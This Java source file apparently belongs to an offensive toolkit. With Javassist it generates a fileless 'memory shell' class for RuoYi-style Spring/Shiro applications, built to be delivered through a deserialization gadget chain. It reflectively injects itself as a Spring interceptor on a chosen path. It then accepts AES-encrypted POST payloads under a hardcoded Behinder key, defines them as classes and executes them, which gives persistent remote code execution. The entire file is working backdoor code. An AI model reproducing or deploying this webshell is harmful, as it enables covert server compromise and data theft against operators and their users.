package org.memshell.ruoyi;

import javassist.*;

import java.io.IOException;
import java.util.UUID;

public class RuoYiSpringInterceptorBehinder {
    public static byte[] generateListenerMemShell(String path) throws CannotCompileException, NotFoundException, IOException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);

        CtClass abstractTransletClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        CtClass handlerInterceptorClass = pool.get("org.springframework.web.servlet.HandlerInterceptor");

        // 继承父类
        ctClass.setSuperclass(abstractTransletClass);

        // 实现接口
        ctClass.setInterfaces(new CtClass[]{handlerInterceptorClass});

        // 创建默认构造器
        CtConstructor ctConstructor = CtNewConstructor.defaultConstructor(ctClass);
        ctClass.addConstructor(ctConstructor);

        // 创建transform方法
        CtMethod transform = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform);

        // 创建transform方法
        CtMethod transform1 = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform1);

        // 创建preHandle方法
        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(javax.servlet.http.HttpServletRequest req1, javax.servlet.http.HttpServletResponse resp, java.lang.Object handler) throws Exception {\n" +
                "   if (!req1.getParameter(\"cmd\").isEmpty() && req1.getMethod().equals(\"POST\")) {\n" +
                "       org.apache.catalina.connector.RequestFacade req = (org.apache.catalina.connector.RequestFacade) ((org.apache.shiro.web.servlet.ShiroHttpServletRequest) req1).getRequest();\n" +
                "       java.lang.reflect.Field requestField = req.getClass().getDeclaredField(\"request\");\n" +
                "       requestField.setAccessible(true);" +
                "       org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) requestField.get(req);\n" +
                "       org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "       javax.servlet.http.HttpSession session = request.getSession();\n" +
                "       java.util.HashMap pageContext = new java.util.HashMap();\n" +
                "       pageContext.put(\"request\", request);\n" +
                "       pageContext.put(\"response\", response);\n" +
                "       pageContext.put(\"session\", session);\n" +
                "       String k = \"47bce5c74f589f48\";\n" +
                "       session.putValue(\"u\", k);" +
                "       javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                "       c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\"));\n" +
                "       java.lang.ClassLoader contextClassLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "       Class aClass = Class.forName(\"java.lang.ClassLoader\");\n" +
                "       java.lang.reflect.Method defineClass = aClass.getDeclaredMethod(\"defineClass\", new Class[]{String.class, byte[].class, int.class, int.class});\n" +
                "       defineClass.setAccessible(true);\n" +
                "       byte[] payload = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));\n" +
                "       Class invoke = (Class) defineClass.invoke(contextClassLoader, new Object[]{null, payload, Integer.valueOf(0), Integer.valueOf(payload.length)});\n" +
                "       invoke.newInstance().equals(pageContext);\n" +
                "       return false;\n" +
                "   }\n" +
                "   return true;\n" +
                "}", ctClass);
        ctClass.addMethod(preHandle);

        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "   java.lang.reflect.Field filed = Class.forName(\"org.springframework.context.support.LiveBeansView\").getDeclaredField(\"applicationContexts\");\n" +
                "   System.out.println(filed);\n" +
                "   filed.setAccessible(true);\n" +
                "   org.springframework.web.context.WebApplicationContext webApplicationContext =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();\n" +
                "   System.out.println(webApplicationContext);\n" +
                "   org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"requestMappingHandlerMapping\");\n" +
                "   java.lang.reflect.Field adaptedInterceptorsField = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                "   adaptedInterceptorsField.setAccessible(true);\n" +
                "   java.util.List adaptedInterceptors =  adaptedInterceptorsField.get(abstractHandlerMapping);\n" +
                "   adaptedInterceptors.add(0,new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"},null,new " + className + "()));\n" +
                "   adaptedInterceptorsField.set(abstractHandlerMapping,adaptedInterceptors);\n" +
                "   org.springframework.web.servlet.handler.AbstractHandlerMapping simpleUrlHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"resourceHandlerMapping\");\n" +
                "   java.util.List adaptedInterceptors1 =  adaptedInterceptorsField.get(abstractHandlerMapping);\n" +
                "   adaptedInterceptors1.add(0,new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"},null,new " + className + "()));\n" +
                "   adaptedInterceptorsField.set(simpleUrlHandlerMapping,adaptedInterceptors1);" +
                "} catch (Exception e) {\n" +
                "   e.printStackTrace();\n" +
                "}");

//        ctClass.writeFile("./output");
        return ctClass.toBytecode();
    }
}
